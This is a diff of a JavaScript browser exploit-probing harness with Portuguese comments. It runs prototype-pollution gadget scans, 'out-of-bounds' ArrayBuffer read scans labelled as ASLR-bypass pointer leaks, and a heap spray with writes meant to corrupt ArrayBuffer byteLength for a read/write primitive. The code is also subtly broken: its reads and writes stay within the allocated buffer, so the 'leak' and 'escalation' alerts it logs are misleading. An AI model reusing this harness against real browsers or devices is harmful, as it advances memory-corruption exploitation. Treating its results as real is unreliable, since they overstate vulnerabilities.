+            if (!keepLog && type === 'good') { const lowerMsg = String(message).toLowerCase(); if (lowerMsg.includes('webgl n/a') || lowerMsg.includes('fail: herança de \'__proto__\'') || lowerMsg.includes('não afetou \'input.value\'') || lowerMsg.includes('nenhum leak potencial óbvio') || lowerMsg.includes('escrita oob falhou/bloqueada') || lowerMsg.includes('nenhuma corrupção detectada')) { keepLog = true; } }
+            if (!keepLog && type === 'error' && String(message).includes('Element.innerHTML setter')) { keepLog = true; }
+            if (!keepLog) { return; } // Pula logs não importantes
 
             if (!outputDivCanvas) return;
-            const logPrefix = `[CANVAS-${type.toUpperCase()}]`;
-            const funcPrefix = funcName ? `[${funcName}] ` : '';
-            const logMsg = `${logPrefix} ${funcPrefix}${message}`;
-            console.log(logMsg); // Manter log no console para debug
-            try {
-                const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                 const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
-                 const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
+            const logPrefix = `[CANVAS-${type.toUpperCase()}]`; const funcPrefix = funcName ? `[${funcName}] ` : '';
+            //...(resto da função logCanvas da v15)...
+            const logMsg = `${logPrefix} ${funcPrefix}${message}`; console.log(logMsg); try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const sM = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(outputDivCanvas.innerHTML.length > 750000){ outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 350000); outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML; } outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${funcPrefix}${sM}\n</span>`; outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight; } catch(e) { console.error("logCanvas ERRO:", e); if (outputDivCanvas) outputDivCanvas.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
+        };
+        const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
+        const toHexCanvas = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0'); };
+        const isPotentialPointer64_S2 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32_S2 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
+        const drawInteractiveAreas = () => { if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error', 'drawInteractiveAreas'); }};
 
-                if(outputDivCanvas.innerHTML.length > 750000){ // Manter truncamento
-                    outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - 350000);
-                    outputDivCanvas.innerHTML = `<span>[Log S2 Truncado...]</span>\n` + outputDivCanvas.innerHTML;
-                }
-                outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${funcPrefix}${sM}\n</span>`;
-                outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight;
+        // *** v16: drawImageSquares MODIFICADO para incluir hover text ***
+        const drawImageSquares = () => {
+            if (!ctx) return;
+            try {
+                imgSquares.forEach((sq, index) => {
+                    ctx.fillStyle = sq.hover ? 'yellow' : sq.color;
+                    ctx.fillRect(sq.x, sq.y, sq.size, sq.size);
+                    ctx.strokeStyle = '#888';
+                    ctx.strokeRect(sq.x, sq.y, sq.size, sq.size);
+
+                    // *** v16: Desenha texto se estiver hover E se o texto existir ***
+                    if (sq.hover && sq.hoverText) {
+                        ctx.fillStyle = '#000'; // Texto preto para contraste no amarelo
+                        ctx.font = 'bold 9px mono'; // Fonte pequena
+                        ctx.textAlign = 'center';
+                        // Ajustar Y para centralizar melhor (experimentar)
+                        ctx.fillText(sq.hoverText, sq.x + sq.size / 2, sq.y + sq.size / 2 + 3);
+                        ctx.textAlign = 'start'; // Resetar alinhamento para outros textos
+                    }
+                });
             } catch(e) {
-                console.error("logCanvas ERRO:", e);
-                 if (outputDivCanvas) outputDivCanvas.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
+                logCanvas(`Erro drawSquares: ${e.message}`, 'error', 'drawImageSquares');
             }
         };
 
-        // Funções PAUSE, toHexCanvas, isPotentialPointer64_S2, isPotentialData32_S2, draw*, redrawAll permanecem iguais
-         const PAUSE = (ms = SHORT_PAUSE_CANVAS) => new Promise(r => setTimeout(r, ms));
-         const toHexCanvas = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let n = Number(val); if (bits <= 32) { n >>>= 0; } const p = Math.ceil(bits / 4); return '0x' + n.toString(16).toUpperCase().padStart(p, '0'); };
-         const isPotentialPointer64_S2 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
-         const isPotentialData32_S2 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
-         const drawInteractiveAreas = () => { if (!ctx) return; try { interactiveAreas.forEach(a => { ctx.fillStyle = (currentHoverTarget === a.id)?a.hoverColor:a.color; ctx.fillRect(a.x, a.y, a.w, a.h); ctx.fillStyle="#FFF"; ctx.font="bold 12px mono"; ctx.textAlign="center"; ctx.fillText(a.text, a.x + a.w / 2, a.y + a.h / 2 + 4); }); ctx.textAlign="start"; } catch(e) { logCanvas(`Erro drawAreas: ${e.message}`, 'error', 'drawInteractiveAreas'); }};
-         const drawImageSquares = () => { if (!ctx) return; try { imgSquares.forEach(sq => { ctx.fillStyle = sq.hover ? 'yellow' : sq.color; ctx.fillRect(sq.x, sq.y, sq.size, sq.size); ctx.strokeStyle = '#888'; ctx.strokeRect(sq.x, sq.y, sq.size, sq.size); }); } catch(e) { logCanvas(`Erro drawSquares: ${e.message}`, 'error', 'drawImageSquares'); }};
-         const redrawAll = () => { if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error', 'redrawAll'); }};
+        const redrawAll = () => { if (!ctx || !canvasElement) return; try { ctx.save(); ctx.clearRect(0, 0, canvasElement.width, canvasElement.height); ctx.fillStyle = "#334"; ctx.fillRect(0, 0, canvasElement.width, canvasElement.height); drawInteractiveAreas(); drawImageSquares(); ctx.fillStyle = currentLeakData.color; ctx.font = "12px mono"; ctx.textAlign = "start"; ctx.fillText(currentLeakData.text, 10, canvasElement.height - 5); ctx.restore(); } catch(e) { logCanvas(`Erro redrawAll: ${e.message}`, 'error', 'redrawAll'); }};
 
+        // ===========================================================
+        // === DEFINIÇÕES DAS FUNÇÕES DE TESTE FOCADAS (Script 2) ===
+        // ===========================================================
 
-        // --- Teste WebGL Check --- (Logs info/subtest omitidos)
-        const testWebGLCheck = async () => {
-             const FNAME = 'testWebGLCheck';
-            logCanvas("--- Teste: Verificação WebGL ---",'test', FNAME);
-            glContext=null; isWebGL2=false;
-            try {
-                glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl');
-                if(glContext){
-                    const glVersion = glContext.getParameter(glContext.VERSION);
-                    logCanvas(`WebGL OK! V:${glVersion}`, 'vuln', FNAME); // Manter VULN
-                     try{
-                         let gl2=canvasElement.getContext('webgl2');
-                         if(gl2){
-                             const gl2Version = gl2.getParameter(gl2.VERSION);
-                            logCanvas(`WebGL2 OK! V:${gl2Version}`, 'vuln', FNAME); // Manter VULN
-                            isWebGL2=true;
-                         } else {
-                            logCanvas("WebGL2 não disponível.", 'good', FNAME); // Manter GOOD específico
-                         }
-                     }catch(e2){
-                         // Warn omitido
-                     }
-                }else{
-                    logCanvas('WebGL N/A.', 'good', FNAME); // Manter GOOD específico
-                }
-             }catch(e){
-                logCanvas(`Erro ao verificar WebGL: ${e.message}`, 'error', FNAME); // Manter ERROR
-                console.error(e);
-                glContext=null;
-             }
-            logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}) ---`, 'test', FNAME); // Manter resumo
-            await PAUSE();
-        };
+        // testWebGLCheck, testAdvancedPP (código da v15, logs já filtrados)
+        const testWebGLCheck = async () => { /* ...código v15... */ const FNAME='testWebGLCheck'; logCanvas("--- Teste: Verificação WebGL ---",'test', FNAME); glContext=null; isWebGL2=false; try { glContext=canvasElement.getContext('webgl')||canvasElement.getContext('experimental-webgl'); if(glContext){ const glVersion = glContext.getParameter(glContext.VERSION); logCanvas(`WebGL OK! V:${glVersion}`, 'vuln', FNAME); try{ let gl2=canvasElement.getContext('webgl2'); if(gl2){ const gl2Version = gl2.getParameter(gl2.VERSION); logCanvas(`WebGL2 OK! V:${gl2Version}`, 'vuln', FNAME); isWebGL2=true; } else { logCanvas("WebGL2 não disponível.", 'good', FNAME); } }catch(e2){}}else{ logCanvas('WebGL N/A.', 'good', FNAME); }}catch(e){ logCanvas(`Erro ao verificar WebGL: ${e.message}`, 'error', FNAME); console.error(e); glContext=null; } logCanvas(`--- Teste Verificação WebGL Concluído (Ativo: ${!!glContext}) ---`, 'test', FNAME); await PAUSE(); };
+        const testAdvancedPP = async () => { /* ...código v15... */ const FNAME='testAdvancedPP'; logCanvas("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' },  { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') },  { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} } ]; const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; for (const item of propsToPollute) { const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); try { if (wasDefined) { originalValue = targetProto[prop]; } targetProto[prop] = testValue; let obj; if (item.createTarget) { obj = item.createTarget(); } else { obj = {}; } const inheritedValue = obj[prop]; if (inheritedValue === testValue) { logCanvas(`-> VULN: Herança de '${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { gadgetMsg = item.gadgetCheck(obj, testValue); if (gadgetMsg) { logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetCount++; if (['href', 'src', 'onclick', 'onerror', 'map', 'call', 'apply'].includes(prop)) { logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { logCanvas(`-> FAIL: Herança de '__proto__' não OK.`, 'good', FNAME); } } } catch (e) { logCanvas(`Erro ao poluir/testar '${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { if (wasDefined) { targetProto[prop] = originalValue; } else { delete targetProto[prop]; } } catch (e) { } } await PAUSE(20); } let gadgetInputOK = false; const inputProp = 'value'; const inputTargetProto = Object.prototype; const inputProtoName = 'Object'; try { const originalInputValue = inputTargetProto[inputProp]; const wasInputValueDefined = Object.prototype.hasOwnProperty.call(inputTargetProto, inputProp); inputTargetProto[inputProp] = testValue; const input = document.createElement('input'); if (input.value === testValue) { logCanvas("-> GADGET VULN: PP afetou 'input.value'!", 'critical', FNAME); logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para 'input.value'! ***`, 'escalation', FNAME); gadgetInputOK = true; successCount++; gadgetCount++; } else { logCanvas("-> GADGET FAIL: PP não afetou 'input.value'.", 'good', FNAME); } } catch (e) { logCanvas(`Erro gadget input.value: ${e.message}`, 'error', FNAME); } finally { try { if (wasInputValueDefined) inputTargetProto[inputProp] = originalInputValue; else delete inputTargetProto[inputProp]; } catch (e) { } } logCanvas(`--- Teste PP Avançado Concluído (${successCount} OK, ${gadgetCount} gadgets) ---`, 'test', FNAME); await PAUSE(); };
 
-        // --- Teste PP Avançado --- (Logs info/subtest omitidos)
-        const testAdvancedPP = async () => {
-            const FNAME = 'testAdvancedPP';
-            logCanvas("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME);
-             // Definição de propsToPollute permanece igual
-            const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' },  { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') },  { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v) => { try{[].map(()=>{}); return null;} catch(e){ return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.call(); return null;} catch(e){ return `Function.call quebrou! ${e.message}`;} }, createTarget: () => function(){} }, { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v) => { try{function f(){}; f.apply(); return null;} catch(e){ return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} } ];
-            const testValue = "PP_Adv_Polluted_" + Date.now();
-            let successCount = 0; let gadgetCount = 0;
-
-            for (const item of propsToPollute) {
-                 const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName;
-                 // Log subtest omitido
-                 let inherited = false; let gadgetMsg = null; let errorMsg = null;
-                 let originalValue = undefined; let wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop);
-                 try {
-                     if (wasDefined) { originalValue = targetProto[prop]; }
-                     // Log info omitido
-                     targetProto[prop] = testValue;
-                     let obj;
-                     if (item.createTarget) { obj = item.createTarget(); } else { obj = {}; }
-                     const inheritedValue = obj[prop];
-                     // Log info omitido
-                     if (inheritedValue === testValue) {
-                         logCanvas(`-> VULN: Herança de '${prop}' OK.`, 'vuln', FNAME); // Manter VULN
-                         inherited = true; successCount++;
-                         if (item.gadgetCheck) {
-                             gadgetMsg = item.gadgetCheck(obj, testValue);
-                             if (gadgetMsg) {
-                                 logCanvas(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); // Manter CRITICAL
-                                 gadgetCount++;
-                                 if (['href', 'src', 'onclick', 'onerror', 'map', 'call', 'apply'].includes(prop)) {
-                                     logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); // Manter ESCALATION
-                                 }
-                             }
-                         }
-                     } else {
-                        // Manter log 'good' apenas para falha de __proto__
-                         if (prop === '__proto__') {
-                            logCanvas(`-> FAIL: Herança de '__proto__' não OK.`, 'good', FNAME);
-                         }
-                     }
-                 } catch (e) {
-                     // Manter erro apenas para innerHTML (já filtrado na função logCanvas)
-                      logCanvas(`Erro ao poluir/testar '${prop}': ${e.message}`, 'error', FNAME); // Manter ERROR
-                     errorMsg = e.message;
-                 } finally {
-                     try { // Limpeza
-                         if (wasDefined) { targetProto[prop] = originalValue; } else { delete targetProto[prop]; }
-                     } catch (e) { /* Omitir erro de limpeza */ }
-                 }
-                 await PAUSE(20);
-            }
-
-            let gadgetInputOK = false; const inputProp = 'value'; const inputTargetProto = Object.prototype; const inputProtoName = 'Object';
-            try {
-                // Log subtest omitido
-                const originalInputValue = inputTargetProto[inputProp]; const wasInputValueDefined = Object.prototype.hasOwnProperty.call(inputTargetProto, inputProp);
-                inputTargetProto[inputProp] = testValue;
-                const input = document.createElement('input');
-                // Log info omitido
-                if (input.value === testValue) {
-                    logCanvas("-> GADGET VULN: PP afetou 'input.value'!", 'critical', FNAME); // Manter CRITICAL
-                     logCanvas(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para 'input.value'! ***`, 'escalation', FNAME); // Manter ESCALATION
-                    gadgetInputOK = true; successCount++; gadgetCount++;
-                } else {
-                    logCanvas("-> GADGET FAIL: PP não afetou 'input.value'.", 'good', FNAME); // Manter GOOD específico
-                }
-            } catch (e) {
-                logCanvas(`Erro gadget input.value: ${e.message}`, 'error', FNAME); // Manter ERROR
-            } finally {
-                 try { if (wasInputValueDefined) inputTargetProto[inputProp] = originalInputValue; else delete inputTargetProto[inputProp]; } catch (e) { }
-            }
-
-            logCanvas(`--- Teste PP Avançado Concluído (${successCount} OK, ${gadgetCount} gadgets) ---`, 'test', FNAME); // Manter resumo
-            await PAUSE();
-        };
-
-
-        // --- Teste OOB Read Enhanced --- (Logs info/subtest omitidos)
-         const testOOBReadEnhanced = async () => {
+        // *** v16: testOOBReadEnhanced MODIFICADO para logar mais dados ***
+        const testOOBReadEnhanced = async () => {
              const FNAME = 'testOOBReadEnhanced';
-             logCanvas("--- Teste: OOB Read Enhanced Scan ---",'test', FNAME);
+             logCanvas("--- Teste: OOB Read Enhanced Scan (Refined Log) ---",'test', FNAME); // Título atualizado
              const bufferSize=32; const readRangeStart=-128; const readRangeEnd=bufferSize+128; const allocationSize = bufferSize + 512; const baseOffsetInBuffer = 256;
+             const fillPattern32 = 0xCCCCCCCC; // Padrão de preenchimento como U32
+
              let potentialLeakFoundCount=0; const foundPointers=[];
-             // Log config omitido
+             let loggedDataCount = 0; // Contar dados não-padrão logados
+
              try{
                  const buffer=new ArrayBuffer(allocationSize); const dataView=new DataView(buffer);
-                 // Log alocação/fill omitido
                  for(let i=0; i<buffer.byteLength; i++){ dataView.setUint8(i, 0xCC); }
-                 // Log início scan omitido
+
                  for(let readOffset=readRangeStart; readOffset<readRangeEnd; readOffset+=4){
                      const readTargetAddress=baseOffsetInBuffer+readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`;
+
+                     // Tentar ler U64
                      if(readTargetAddress>=0 && readTargetAddress+8<=buffer.byteLength){
                          try{
-                             const low=dataView.getUint32(readTargetAddress,true); const high=dataView.getUint32(readTargetAddress+4,true);
-                             if (low === 0xCCCCCCCC && high === 0xCCCCCCCC) continue;
+                             const low=dataView.getUint32(readTargetAddress,true);
+                             const high=dataView.getUint32(readTargetAddress+4,true);
+
+                             if (low === fillPattern32 && high === fillPattern32) continue; // Pular padrão
+
                              if(isPotentialPointer64_S2(high,low)){
                                  const valueStr=`H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`;
-                                 logCanvas(` -> PTR? U64 ${relOffsetStr}: ${valueStr}`,'ptr', FNAME); // Manter PTR
+                                 logCanvas(` -> PTR? U64 ${relOffsetStr}: ${valueStr}`,'ptr', FNAME);
                                  potentialLeakFoundCount++;
                                  const leakInfo = {offset:readOffset, type:'U64', high, low, hex:valueStr}; foundPointers.push(leakInfo);
-                                  logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME); // Manter ESCALATION
+                                 logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Vazamento de Ponteiro OOB Read - Bypass ASLR) ***`, 'escalation', FNAME);
+                              } else if (low !== 0 || high !== 0) {
+                                 // *** v16: Logar dados U64 não-padrão e não-ponteiro ***
+                                 logCanvas(` -> Data? U64 ${relOffsetStr}: H=${toHexCanvas(high,32)} L=${toHexCanvas(low,32)}`, 'leak', FNAME); // Usar tipo 'leak' para visibilidade na v15
+                                 loggedDataCount++;
                               }
                          }catch(e){}
                      }
+                     // Tentar ler U32
                      else if(readTargetAddress>=0 && readTargetAddress+4<=buffer.byteLength){
                          try{
                              const val32=dataView.getUint32(readTargetAddress,true);
-                              if (val32 === 0xCCCCCCCC) continue;
+                              if (val32 === fillPattern32) continue; // Pular padrão
+
                               let alreadyLoggedAsPtr64 = foundPointers.some(p => p.offset === readOffset && p.type === 'U64');
+
                              if(!alreadyLoggedAsPtr64 && isPotentialData32_S2(val32) && !isPotentialPointer64_S2(0,val32)){
-                                 logCanvas(` -> Leak U32? ${relOffsetStr}: ${toHexCanvas(val32,32)}`,'leak', FNAME); // Manter LEAK
+                                 logCanvas(` -> Leak U32? ${relOffsetStr}: ${toHexCanvas(val32,32)}`,'leak', FNAME);
                                  potentialLeakFoundCount++;
                                  const leakInfo = {offset:readOffset, type:'U32', value:val32, hex:toHexCanvas(val32)}; foundPointers.push(leakInfo);
-                                  logCanvas(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME); // Manter ESCALATION
+                                 logCanvas(` ---> *** ALERTA: Potencial Vazamento de Informação OOB Read U32 ***`, 'escalation', FNAME);
+                              } else if (val32 !== 0 && !alreadyLoggedAsPtr64) {
+                                 // *** v16: Logar dados U32 não-padrão e não-leak óbvio ***
+                                 logCanvas(` -> Data? U32 ${relOffsetStr}: ${toHexCanvas(val32,32)}`, 'leak', FNAME); // Usar tipo 'leak' para visibilidade na v15
+                                 loggedDataCount++;
                               }
                          }catch(e){}
                      }
                      if(readOffset % 64 === 0) await PAUSE(1);
                  }
-             }catch(e){
-                 logCanvas(`Erro fatal no Teste OOB Read Scan: ${e.message}`,'error', FNAME); // Manter ERROR
-                 console.error(e);
-             } finally {
-                logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks potenciais encontrados) ---`,'test', FNAME); // Manter resumo
-                if(foundPointers.length === 0){
-                    logCanvas("Nenhum leak potencial óbvio encontrado nesta varredura.", 'good', FNAME); // Manter GOOD específico
-                } else {
-                     console.log("Potenciais Leaks Encontrados (OOB Read Enhanced):", foundPointers); // Manter log no console
-                }
+             }catch(e){ logCanvas(`Erro fatal no Teste OOB Read Scan: ${e.message}`,'error', FNAME); console.error(e); }
+             finally {
+                 // Resumo mais detalhado
+                 logCanvas(`--- Teste OOB Read Scan Concluído (${potentialLeakFoundCount} leaks ptr/data32 potenciais, ${loggedDataCount} outros dados não-padrão) ---`,'test', FNAME);
+                 if(potentialLeakFoundCount === 0 && loggedDataCount === 0){
+                    logCanvas("Nenhum leak ou dado não-padrão encontrado nesta varredura.", 'good', FNAME);
+                 } else if (foundPointers.length > 0) {
+                     console.log("Potenciais Leaks Encontrados (OOB Read Enhanced):", foundPointers);
+                 }
              }
              await PAUSE(); return foundPointers;
         };
 
-        // --- Teste OOB Write Metadata --- (Logs info/subtest/warn omitidos)
-        const testOOBWriteMetadata = async () => {
-            const FNAME = 'testOOBWriteMetadata';
-            logCanvas("--- Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME);
-            const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE;
-            const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false;
-            const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128;
-            // Log config omitido
-            try{
-                // Log alocação omitido
-                controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer);
-                for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD);
-            }catch(e){ logCanvas(`Erro fatal ao alocar buffer de controle: ${e.message}`, 'error', FNAME); console.error(e); return; } // Manter ERROR
-
-            // Log spray omitido
-            for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){ /* Warn omitido */ } }
-            // Log contagem omitido
-            await PAUSE();
-
-            const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; let foundOffset=-1;
-            for(const tryOffset of metadataOffsetsToTry){
-                 const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset; const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`;
-                 // Log tentativa omitido
-                 let currentWriteOK=false;
-                 try{
-                     if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){
-                         dv.setUint32(targetWriteAddr, targetValue, true);
-                         // Log info de escrita omitido
-                         writeSuccessCount++; currentWriteOK=true;
-                     } else { /* Warn omitido */ }
-                 }catch(e){ /* Warn omitido */ }
-
-                 if(currentWriteOK){
-                     // Log verificação omitido
-                     for(let j=0; j<targetBuffers.length; j++){
-                         try {
-                             if(targetBuffers[j] && targetBuffers[j].byteLength === targetValue){
-                                 logCanvas(`---> VULN: ArrayBuffer alvo ${j} teve seu byteLength CORROMPIDO para ${toHexCanvas(targetValue)} com escrita OOB em ${relOffsetStr}! <---`, 'critical', FNAME); // Manter CRITICAL
-                                  logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Metadados OOB Write -> Read/Write Primitivo Poderoso) ***`, 'escalation', FNAME); // Manter ESCALATION
-                                 corruptionSuccess=true; foundOffset=tryOffset;
-                                 try{ // Tentar ler OOB
-                                     const corruptedView=new DataView(targetBuffers[j]);
-                                     const readOOBAddr = targetBufferSize + 4;
-                                     const readOOBValue = corruptedView.getUint32(readOOBAddr, true);
-                                     logCanvas(`  -> Leitura OOB via AB ${j} corrompido @ offset ${readOOBAddr}: ${toHexCanvas(readOOBValue)}`, 'leak', FNAME); // Manter LEAK
-                                      logCanvas(` ---> *** ALERTA: Leitura OOB confirmada usando buffer corrompido! ***`, 'escalation', FNAME); // Manter ESCALATION
-                                 }catch(eRead){ /* Warn omitido */ }
-                                 break;
-                             }
-                         } catch(eCheck) { logCanvas(`Erro ao verificar buffer alvo ${j}: ${eCheck.message}`, 'error', FNAME); } // Manter ERROR
